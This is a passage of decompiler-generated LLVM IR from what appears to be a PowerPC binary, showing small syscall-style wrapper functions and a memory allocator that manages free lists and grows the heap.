  %storemerge = phi i32 [ 0, %dec_label_pc_10007ac8 ], [ 1, %dec_label_pc_10007954 ], [ 1, %dec_label_pc_10007b10 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_10007b08 = load i32, i32* @r24, align 4
  %v2_10007b08 = inttoptr i32 %v1_10007b08 to i32*
  store i32 %storemerge, i32* %v2_10007b08, align 4
  br label %dec_label_pc_10007b28

dec_label_pc_10007b10:                            ; preds = %dec_label_pc_10007aa4
  %v3_10007b10 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10007b10, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007b18.255 to i32), i32* @lr, align 4
  %v1_10007b14 = call i32 @function_10007e48(i32 %v3_10007b10)
  store i32 %v1_10007b14, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007b08

dec_label_pc_10007b24:                            ; preds = %dec_label_pc_100078e8, %dec_label_pc_100078cc, %dec_label_pc_100078c0, %dec_label_pc_100078b0, %dec_label_pc_100078a0
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007b28

dec_label_pc_10007b28:                            ; preds = %dec_label_pc_10007884, %dec_label_pc_1000787c, %dec_label_pc_10007830, %dec_label_pc_100077f8, %dec_label_pc_10007b08, %dec_label_pc_100079e4, %dec_label_pc_10007928, %dec_label_pc_10007b24
  store i32 %v0_100077fc, i32* %r0.global-to-local, align 4
  %v0_10007b38 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10007b38

; uselistorder directives
  uselistorder i32 %v0_10007aac, { 1, 0 }
  uselistorder i32 %v1_10007a7c, { 1, 0 }
  uselistorder i32 %v1_10007a70, { 1, 0 }
  uselistorder i32 %v1_10007a68, { 1, 0 }
  uselistorder i32 %v0_10007a54, { 1, 0 }
  uselistorder i32 %v1_10007a683, { 1, 0 }
  uselistorder i32 %v1_10007a30, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10007a28, { 1, 0, 2 }
  uselistorder i32 %v0_100079b0, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_100078f4, { 1, 0, 2 }
  uselistorder i32 %v0_100078b0.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10007898, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 25, 2, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 19, 8, 6, 7, 9, 10, 11, 12, 13, 15, 16, 14, 17, 18 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_10007b28, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10007b08, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10007aa4, { 1, 0 }
  uselistorder label %dec_label_pc_10007a50, { 1, 0 }
  uselistorder label %dec_label_pc_100078b0, { 1, 0 }
}

define i32 @function_10007b3c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007b3c:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007b50 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467040, i32* @lr, align 4
  %v2_10007b5c = call i32 @function_10008fe4(i32 5, i32 %v2_10007b50)
  ret i32 %v2_10007b5c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007b70(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007b70:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007b84 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467092, i32* @lr, align 4
  %v2_10007b90 = call i32 @function_10008fe4(i32 2, i32 %v2_10007b84)
  ret i32 %v2_10007b90

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007ba4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007ba4:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007bb8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467144, i32* @lr, align 4
  %v2_10007bc4 = call i32 @function_10008fe4(i32 3, i32 %v2_10007bb8)
  ret i32 %v2_10007bc4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007bd8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007bd8:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007bec = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467192, i32* @lr, align 4
  %v2_10007bf4 = call i32 @function_10008fe4(i32 4, i32 %v2_10007bec)
  ret i32 %v2_10007bf4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007c08(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007c08:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007c1c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467248, i32* @lr, align 4
  %v2_10007c2c = call i32 @function_10008fe4(i32 10, i32 %v2_10007c1c)
  ret i32 %v2_10007c2c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007c40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10007c40:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10007c54 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268467312, i32* @lr, align 4
  %v2_10007c6c = call i32 @function_10008fe4(i32 11, i32 %v2_10007c54)
  ret i32 %v2_10007c6c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_10007c80(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10007c80:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10007c94 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268467372, i32* @lr, align 4
  %v2_10007ca8 = call i32 @function_10008fe4(i32 14, i32 %v2_10007c94)
  ret i32 %v2_10007ca8

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_10007cbc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007cbc:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10007cd0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467424, i32* @lr, align 4
  %v2_10007cdc = call i32 @function_10008fe4(i32 1, i32 %v2_10007cd0)
  ret i32 %v2_10007cdc

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10007cf0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007cf0:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10007cf0 = load i32, i32* %r3.global-to-local, align 4
  %v3_10007cf0 = icmp eq i32 %v0_10007cf0, 0
  br i1 %v3_10007cf0, label %dec_label_pc_10007d08, label %dec_label_pc_10007d0c

dec_label_pc_10007d08:                            ; preds = %dec_label_pc_10007cf0
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007d0c

dec_label_pc_10007d0c:                            ; preds = %dec_label_pc_10007cf0, %dec_label_pc_10007d08
  %v0_10007d1c = phi i32 [ 1, %dec_label_pc_10007d08 ], [ %v0_10007cf0, %dec_label_pc_10007cf0 ]
  %v3_10007d10 = icmp ugt i32 %v0_10007d1c, -8
  br i1 %v3_10007d10, label %dec_label_pc_10007e20, label %dec_label_pc_10007d18

dec_label_pc_10007d18:                            ; preds = %dec_label_pc_10007d0c
  %v1_10007d1c = add i32 %v0_10007d1c, 4
  store i32 ptrtoint (i32* @global_var_10012af4.256 to i32), i32* @r29, align 4
  store i32 %v1_10007d1c, i32* %stack_var_-40, align 4
  store i32 ptrtoint (i32* @global_var_10012af4.256 to i32), i32* %r3.global-to-local, align 4
  %v0_10007d2c = call i32 @function_10008c7c()
  %v2_10007d34 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1088), i32* %r3.global-to-local, align 4
  %v3_10007d3c = call i32 @function_10007f48(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1088) to i32*), i32 %v2_10007d34)
  store i32 %v3_10007d3c, i32* %r31.global-to-local, align 4
  %v0_10007d44 = load i32, i32* @r29, align 4
  store i32 %v0_10007d44, i32* %r3.global-to-local, align 4
  %v0_10007d48 = call i32 @function_10008c7c()
  store i32 %v0_10007d48, i32* %r3.global-to-local, align 4
  %v3_10007d4c = icmp eq i32 %v3_10007d3c, 0
  br i1 %v3_10007d4c, label %dec_label_pc_10007d54, label %dec_label_pc_10007e04.thread

dec_label_pc_10007e04.thread:                     ; preds = %dec_label_pc_10007d18
  br label %dec_label_pc_10007e18

dec_label_pc_10007d54:                            ; preds = %dec_label_pc_10007d18
  %v3_10007d58 = load i32, i32* @global_var_100104ac.259, align 4
  store i32 %v3_10007d58, i32* %r31.global-to-local, align 4
  %v3_10007d5c = load i32, i32* %stack_var_-40, align 4
  %v2_10007d60 = icmp ult i32 %v3_10007d5c, %v3_10007d58
  br i1 %v2_10007d60, label %dec_label_pc_10007d78, label %dec_label_pc_10007d68

dec_label_pc_10007d68:                            ; preds = %dec_label_pc_10007d54
  %v1_10007d6c = sub i32 0, %v3_10007d58
  %v2_10007d68 = add i32 %v3_10007d58, -1
  %v1_10007d70 = add i32 %v2_10007d68, %v3_10007d5c
  %v2_10007d74 = and i32 %v1_10007d70, %v1_10007d6c
  store i32 %v2_10007d74, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007d78

dec_label_pc_10007d78:                            ; preds = %dec_label_pc_10007d54, %dec_label_pc_10007d68
  store i32 ptrtoint (i32* @global_var_10012d24.260 to i32), i32* %r3.global-to-local, align 4
  %v0_10007d84 = call i32 @function_10008c7c()
  %v0_10007d88 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10007d88, i32* %r3.global-to-local, align 4
  store i32 268467600, i32* @lr, align 4
  %v1_10007d8c = call i32 @function_10009418(i32 %v0_10007d88)
  store i32 %v1_10007d8c, i32* %r3.global-to-local, align 4
  %v3_10007d90 = icmp eq i32 %v1_10007d8c, -1
  br i1 %v3_10007d90, label %dec_label_pc_10007db0, label %dec_label_pc_10007d98

dec_label_pc_10007d98:                            ; preds = %dec_label_pc_10007d78
  %v1_10007d98 = add i32 %v1_10007d8c, 3
  %v1_10007d9c = call i32 @__asm_rlwinm(i32 %v1_10007d98, i32 0, i32 0, i32 29)
  store i32 %v1_10007d9c, i32* @r30, align 4
  %v4_10007da0 = icmp eq i32 %v1_10007d9c, %v1_10007d8c
  br i1 %v4_10007da0, label %dec_label_pc_10007db0, label %dec_label_pc_10007da8

dec_label_pc_10007da8:                            ; preds = %dec_label_pc_10007d98
  %v2_10007da8 = sub i32 %v1_10007d9c, %v1_10007d8c
  store i32 %v2_10007da8, i32* %r3.global-to-local, align 4
  store i32 268467632, i32* @lr, align 4
  %v1_10007dac = call i32 @function_10009418(i32 %v2_10007da8)
  store i32 %v1_10007dac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007db0

dec_label_pc_10007db0:                            ; preds = %dec_label_pc_10007d98, %dec_label_pc_10007d78, %dec_label_pc_10007da8
  store i32 ptrtoint (i32* @global_var_10012d24.260 to i32), i32* %r3.global-to-local, align 4
  %v0_10007db8 = call i32 @function_10008c7c()
  store i32 %v0_10007db8, i32* %r3.global-to-local, align 4
  %v0_10007dbc = load i32, i32* @r30, align 4
  %v3_10007dbc = icmp eq i32 %v0_10007dbc, -1
  br i1 %v3_10007dbc, label %dec_label_pc_10007e20, label %dec_label_pc_10007e04

dec_label_pc_10007e04:                            ; preds = %dec_label_pc_10007db0
  store i32 ptrtoint (i32* @global_var_10012af4.256 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10010440 to i32), i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10012af4.256 to i32), i32* %r3.global-to-local, align 4
  %v0_10007dd8 = call i32 @function_10008c7c()
  %v0_10007ddc = load i32, i32* @r31, align 4
  %v0_10007de0 = load i32, i32* @r30, align 4
  %v0_10007de4 = load i32, i32* @r29, align 4
  store i32 %v0_10007de4, i32* %r3.global-to-local, align 4
  store i32 268467692, i32* @lr, align 4
  %v3_10007de8 = inttoptr i32 %v0_10007de4 to i32*
  %v4_10007de8 = call i32 @function_10008030(i32* %v3_10007de8, i32 %v0_10007de0, i32 %v0_10007ddc)
  %v0_10007dec = load i32, i32* @r29, align 4
  store i32 %v0_10007dec, i32* %r3.global-to-local, align 4
  %v2_10007df4 = inttoptr i32 %v0_10007dec to i32*
  %v3_10007df4 = call i32 @function_10007f48(i32* %v2_10007df4, i32 %v2_10007d34)
  store i32 %v3_10007df4, i32* %r31.global-to-local, align 4
  %v0_10007dfc = load i32, i32* @r28, align 4
  store i32 %v0_10007dfc, i32* %r3.global-to-local, align 4
  %v0_10007e00 = call i32 @function_10008c7c()
  store i32 %v0_10007e00, i32* %r3.global-to-local, align 4
  %v3_10007e04 = icmp eq i32 %v3_10007df4, 0
  br i1 %v3_10007e04, label %dec_label_pc_10007e18.thread, label %dec_label_pc_10007e18

dec_label_pc_10007e18.thread:                     ; preds = %dec_label_pc_10007e04
  br label %dec_label_pc_10007e20

dec_label_pc_10007e18:                            ; preds = %dec_label_pc_10007e04, %dec_label_pc_10007e04.thread
  %v0_10007e18.pr6 = phi i32 [ %v3_10007d3c, %dec_label_pc_10007e04.thread ], [ %v3_10007df4, %dec_label_pc_10007e04 ]
  %v3_10007e0c = load i32, i32* %stack_var_-40, align 4
  %v2_10007e10 = inttoptr i32 %v0_10007e18.pr6 to i32*
  store i32 %v3_10007e0c, i32* %v2_10007e10, align 4
  %v0_10007e14 = load i32, i32* %r31.global-to-local, align 4
  %v1_10007e14 = add i32 %v0_10007e14, 4
  store i32 %v1_10007e14, i32* @r31, align 4
  %v3_10007e18 = icmp eq i32 %v1_10007e14, 0
  br i1 %v3_10007e18, label %dec_label_pc_10007e20, label %dec_label_pc_10007e30

dec_label_pc_10007e20:                            ; preds = %dec_label_pc_10007e18.thread, %dec_label_pc_10007e18, %dec_label_pc_10007db0, %dec_label_pc_10007d0c
  %v0_10007e20 = call i32 @function_10004b48()
  store i32 %v0_10007e20, i32* %r3.global-to-local, align 4
  %v2_10007e28 = inttoptr i32 %v0_10007e20 to i32*
  store i32 12, i32* %v2_10007e28, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10007e30

dec_label_pc_10007e30:                            ; preds = %dec_label_pc_10007e18, %dec_label_pc_10007e20
  %v0_10007e34 = phi i32 [ %v1_10007e14, %dec_label_pc_10007e18 ], [ 0, %dec_label_pc_10007e20 ]
  store i32 %v0_10007e34, i32* %r3.global-to-local, align 4
  ret i32 %v0_10007e34

; uselistorder directives
  uselistorder i32 %v0_10007e34, { 1, 0 }
  uselistorder i32 %v1_10007e14, { 1, 0, 2 }
  uselistorder i32 %v1_10007d9c, { 1, 0, 2 }
  uselistorder i32 %v1_10007d8c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_10007d58, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10007d3c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 2, 16, 15, 3, 17, 18, 19, 20, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_10012af4.256 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10007e30, { 1, 0 }
  uselistorder label %dec_label_pc_10007e20, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10007db0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007d78, { 1, 0 }
  uselistorder label %dec_label_pc_10007d0c, { 1, 0 }
}

define i32 @function_10007e48(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007e48:
  %v3_10007e48 = icmp eq i32 %arg1, 0
  br i1 %v3_10007e48, label %dec_label_pc_10007f34, label %dec_label_pc_10007e60

dec_label_pc_10007e60:                            ; preds = %dec_label_pc_10007e48
  %v1_10007e64 = add i32 %arg1, -4
  %v2_10007e64 = inttoptr i32 %v1_10007e64 to i32*
  %v3_10007e64 = load i32, i32* %v2_10007e64, align 4
  store i32 %v3_10007e64, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* @r26, align 4
  %v0_10007e78 = call i32 @function_10008c7c()
  %v0_10007e80 = load i32, i32* @r28, align 4
  store i32 268467852, i32* @lr, align 4
  %v4_10007e88 = call i32 @function_10008030(i32* nonnull @global_var_10010440, i32 %v1_10007e64, i32 %v0_10007e80)
  %v3_10007e90 = load i32, i32* @global_var_100104ac.259, align 4
  store i32 %v4_10007e88, i32* @r29, align 4
  %v1_10007e98 = inttoptr i32 %v4_10007e88 to i32*
  %v2_10007e98 = load i32, i32* %v1_10007e98, align 4
  store i32 %v2_10007e98, i32* @r27, align 4
  %v1_10007e9c = mul i32 %v3_10007e90, 8
  %v2_10007ea0 = icmp ult i32 %v2_10007e98, %v1_10007e9c
  br i1 %v2_10007ea0, label %dec_label_pc_10007ed4, label %dec_label_pc_10007ea8

dec_label_pc_10007ea8:                            ; preds = %dec_label_pc_10007e60
  store i32 ptrtoint (i32* @global_var_10012d24.260 to i32), i32* @r28, align 4
  %v0_10007eb8 = call i32 @function_10008c7c()
  store i32 268467908, i32* @lr, align 4
  %v1_10007ec0 = call i32 @function_10009418(i32 0)
  %v0_10007ec4 = load i32, i32* @r31, align 4
  %v4_10007ec4 = icmp eq i32 %v0_10007ec4, %v1_10007ec0
  br i1 %v4_10007ec4, label %dec_label_pc_10007edc, label %dec_label_pc_10007ecc

dec_label_pc_10007ecc:                            ; preds = %dec_label_pc_10007ea8
  %v0_10007ed0 = call i32 @function_10008c7c()
  br label %dec_label_pc_10007ed4

dec_label_pc_10007ed4:                            ; preds = %dec_label_pc_10007e60, %dec_label_pc_10007ecc
  br label %dec_label_pc_10007f30

dec_label_pc_10007edc:                            ; preds = %dec_label_pc_10007ea8
  %v0_10007edc = load i32, i32* @r29, align 4
  %v1_10007edc = add i32 %v0_10007edc, 4
  %v2_10007edc = inttoptr i32 %v1_10007edc to i32*
  %v3_10007edc = load i32, i32* %v2_10007edc, align 4
  %v3_10007ee0 = icmp eq i32 %v3_10007edc, 0
  br i1 %v3_10007ee0, label %dec_label_pc_10007ef0, label %dec_label_pc_10007ee8

dec_label_pc_10007ee8:                            ; preds = %dec_label_pc_10007edc
  %v1_10007ee8 = add i32 %v0_10007edc, 8
  %v2_10007ee8 = inttoptr i32 %v1_10007ee8 to i32*
  %v3_10007ee8 = load i32, i32* %v2_10007ee8, align 4
  %v2_10007eec = add i32 %v3_10007edc, 8
  %v3_10007eec = inttoptr i32 %v2_10007eec to i32*
  store i32 %v3_10007ee8, i32* %v3_10007eec, align 4
  %v0_10007ef0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10007ef0

dec_label_pc_10007ef0:                            ; preds = %dec_label_pc_10007edc, %dec_label_pc_10007ee8
  %v0_10007ef0 = phi i32 [ %v0_10007edc, %dec_label_pc_10007edc ], [ %v0_10007ef0.pre, %dec_label_pc_10007ee8 ]
  %v1_10007ef0 = add i32 %v0_10007ef0, 8
  %v2_10007ef0 = inttoptr i32 %v1_10007ef0 to i32*
  %v3_10007ef0 = load i32, i32* %v2_10007ef0, align 4
  %v1_10007ef4 = add i32 %v0_10007ef0, 4
  %v2_10007ef4 = inttoptr i32 %v1_10007ef4 to i32*
  %v3_10007ef4 = load i32, i32* %v2_10007ef4, align 4
  %v3_10007ef8 = icmp eq i32 %v3_10007ef0, 0
  br i1 %v3_10007ef8, label %dec_label_pc_10007f08, label %dec_label_pc_10007f00

dec_label_pc_10007f00:                            ; preds = %dec_label_pc_10007ef0
  %v2_10007f00 = add i32 %v3_10007ef0, 4
  %v3_10007f00 = inttoptr i32 %v2_10007f00 to i32*
  store i32 %v3_10007ef4, i32* %v3_10007f00, align 4
  br label %dec_label_pc_10007f0c

dec_label_pc_10007f08:                            ; preds = %dec_label_pc_10007ef0
  store i32 %v3_10007ef4, i32* @global_var_10010440, align 4
  br label %dec_label_pc_10007f0c

dec_label_pc_10007f0c:                            ; preds = %dec_label_pc_10007f00, %dec_label_pc_10007f08
  %v0_10007f14 = call i32 @function_10008c7c()
  %v0_10007f18 = load i32, i32* @r27, align 4
  %v1_10007f18 = load i32, i32* @r29, align 4
  %v0_10007f20 = load i32, i32* @r31, align 4
  %v2_10007f18 = sub i32 12, %v0_10007f18
  %v1_10007f1c = add i32 %v2_10007f18, %v1_10007f18
  %v2_10007f20 = sub i32 %v1_10007f1c, %v0_10007f20
  store i32 268468008, i32* @lr, align 4
  %v1_10007f24 = call i32 @function_10009418(i32 %v2_10007f20)
  br label %dec_label_pc_10007f30

dec_label_pc_10007f30:                            ; preds = %dec_label_pc_10007ed4, %dec_label_pc_10007f0c
  %v0_10007f30 = call i32 @function_10008c7c()
  br label %dec_label_pc_10007f34

dec_label_pc_10007f34:                            ; preds = %dec_label_pc_10007e48, %dec_label_pc_10007f30
  %v0_10007f44 = phi i32 [ 0, %dec_label_pc_10007e48 ], [ %v0_10007f30, %dec_label_pc_10007f30 ]
  ret i32 %v0_10007f44

; uselistorder directives
  uselistorder i32 %v0_10007ef0, { 1, 0 }
  uselistorder i32 (i32)* @function_10009418, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_10010440, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007f34, { 1, 0 }
  uselistorder label %dec_label_pc_10007f30, { 1, 0 }
  uselistorder label %dec_label_pc_10007f0c, { 1, 0 }
  uselistorder label %dec_label_pc_10007ef0, { 1, 0 }
  uselistorder label %dec_label_pc_10007ed4, { 1, 0 }
}

define i32 @function_10007f48(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007f48:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_10007f48 = inttoptr i32 %arg2 to i32*
  %v2_10007f48 = load i32, i32* %v1_10007f48, align 4
  %v1_10007f4c = add i32 %v2_10007f48, 3
  store i32 %v1_10007f4c, i32* %r9.global-to-local, align 4
  %v1_10007f50 = call i32 @__asm_rlwinm(i32 %v1_10007f4c, i32 0, i32 0, i32 29)
  %v2_10007f54 = icmp ugt i32 %v1_10007f50, 11
  br i1 %v2_10007f54, label %dec_label_pc_10007fd8.preheader, label %dec_label_pc_10007f5c

dec_label_pc_10007f5c:                            ; preds = %dec_label_pc_10007f48
  br label %dec_label_pc_10007fd8.preheader

dec_label_pc_10007fd8.preheader:                  ; preds = %dec_label_pc_10007f48, %dec_label_pc_10007f5c
  %storemerge20 = phi i32 [ 12, %dec_label_pc_10007f5c ], [ %v1_10007f50, %dec_label_pc_10007f48 ]
  %v0_10007fbc = phi i32 [ 12, %dec_label_pc_10007f5c ], [ %v1_10007f50, %dec_label_pc_10007f48 ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_10007fd85 = icmp eq i32 %storemerge2, 0
  br i1 %v3_10007fd85, label %dec_label_pc_10007fe0, label %dec_label_pc_10007f68

dec_label_pc_10007f68:                            ; preds = %dec_label_pc_10007fd8.preheader, %dec_label_pc_10007fd4
  %v0_10007fd4 = phi i32 [ %storemerge, %dec_label_pc_10007fd4 ], [ %storemerge2, %dec_label_pc_10007fd8.preheader ]
  %v1_10007f68 = inttoptr i32 %v0_10007fd4 to i32*
  %v2_10007f68 = load i32, i32* %v1_10007f68, align 4
  store i32 %v2_10007f68, i32* %r10.global-to-local, align 4
  %v2_10007f6c = icmp ult i32 %v2_10007f68, %v0_10007fbc
  br i1 %v2_10007f6c, label %dec_label_pc_10007fd4, label %dec_label_pc_10007f74

dec_label_pc_10007f74:                            ; preds = %dec_label_pc_10007f68
  %v1_10007f74 = add i32 %v0_10007fbc, 44
  %v2_10007f78 = icmp ult i32 %v2_10007f68, %v1_10007f74
  br i1 %v2_10007f78, label %dec_label_pc_10007f80, label %dec_label_pc_10007fbc

dec_label_pc_10007f80:                            ; preds = %dec_label_pc_10007f74
  %v1_10007f80 = add i32 %v0_10007fd4, 4
  %v2_10007f80 = inttoptr i32 %v1_10007f80 to i32*
  %v3_10007f80 = load i32, i32* %v2_10007f80, align 4
  store i32 %v3_10007f80, i32* %r11.global-to-local, align 4
  %v3_10007f84 = icmp eq i32 %v3_10007f80, 0
  br i1 %v3_10007f84, label %dec_label_pc_10007f94, label %dec_label_pc_10007f8c

dec_label_pc_10007f8c:                            ; preds = %dec_label_pc_10007f80
  %v1_10007f8c = add i32 %v0_10007fd4, 8
  %v2_10007f8c = inttoptr i32 %v1_10007f8c to i32*
  %v3_10007f8c = load i32, i32* %v2_10007f8c, align 4
  %v2_10007f90 = add i32 %v3_10007f80, 8
  %v3_10007f90 = inttoptr i32 %v2_10007f90 to i32*
  store i32 %v3_10007f8c, i32* %v3_10007f90, align 4
  %v0_10007f94.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10007fb0.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007f94

dec_label_pc_10007f94:                            ; preds = %dec_label_pc_10007f80, %dec_label_pc_10007f8c
  %v0_10007fb0 = phi i32 [ %v2_10007f68, %dec_label_pc_10007f80 ], [ %v0_10007fb0.pre, %dec_label_pc_10007f8c ]
  %v0_10007f94 = phi i32 [ %v0_10007fd4, %dec_label_pc_10007f80 ], [ %v0_10007f94.pre, %dec_label_pc_10007f8c ]
  %v1_10007f94 = add i32 %v0_10007f94, 8
  %v2_10007f94 = inttoptr i32 %v1_10007f94 to i32*
  %v3_10007f94 = load i32, i32* %v2_10007f94, align 4
  %v1_10007f98 = add i32 %v0_10007f94, 4
  %v2_10007f98 = inttoptr i32 %v1_10007f98 to i32*
  %v3_10007f98 = load i32, i32* %v2_10007f98, align 4
  %v3_10007f9c = icmp eq i32 %v3_10007f94, 0
  store i32 %v0_10007fb0, i32* %r11.global-to-local, align 4
  br i1 %v3_10007f9c, label %dec_label_pc_10007fb0, label %dec_label_pc_10007fa4

dec_label_pc_10007fa4:                            ; preds = %dec_label_pc_10007f94
  %v2_10007fa8 = add i32 %v3_10007f94, 4
  %v3_10007fa8 = inttoptr i32 %v2_10007fa8 to i32*
  store i32 %v3_10007f98, i32* %v3_10007fa8, align 4
  br label %dec_label_pc_10007fc4

dec_label_pc_10007fb0:                            ; preds = %dec_label_pc_10007f94
  store i32 %v3_10007f98, i32* %arg1, align 4
  br label %dec_label_pc_10007fc4

dec_label_pc_10007fbc:                            ; preds = %dec_label_pc_10007f74
  %v2_10007fbc = sub i32 %v2_10007f68, %v0_10007fbc
  store i32 %v2_10007fbc, i32* %v1_10007f68, align 4
  br label %dec_label_pc_10007fc4

dec_label_pc_10007fc4:                            ; preds = %dec_label_pc_10007fb0, %dec_label_pc_10007fa4, %dec_label_pc_10007fbc
  %v0_10007fc4 = load i32, i32* %r10.global-to-local, align 4
  %v1_10007fc4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007fc4 = sub i32 %v1_10007fc4, %v0_10007fc4
  store i32 %v2_10007fc4, i32* %r9.global-to-local, align 4
  %v0_10007fc8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10007fc8, i32* %v1_10007f48, align 4
  %v0_10007fcc = load i32, i32* %r9.global-to-local, align 4
  %v1_10007fcc = add i32 %v0_10007fcc, 12
  ret i32 %v1_10007fcc

dec_label_pc_10007fd4:                            ; preds = %dec_label_pc_10007f68
  %v1_10007fd4 = add i32 %v0_10007fd4, 4
  %storemerge.in = inttoptr i32 %v1_10007fd4 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_10007fd8 = icmp eq i32 %storemerge, 0
  br i1 %v3_10007fd8, label %dec_label_pc_10007fd8.dec_label_pc_10007fe0_crit_edge, label %dec_label_pc_10007f68

dec_label_pc_10007fd8.dec_label_pc_10007fe0_crit_edge: ; preds = %dec_label_pc_10007fd4
  br label %dec_label_pc_10007fe0

dec_label_pc_10007fe0:                            ; preds = %dec_label_pc_10007fd8.dec_label_pc_10007fe0_crit_edge, %dec_label_pc_10007fd8.preheader
  ret i32 0

; uselistorder directives
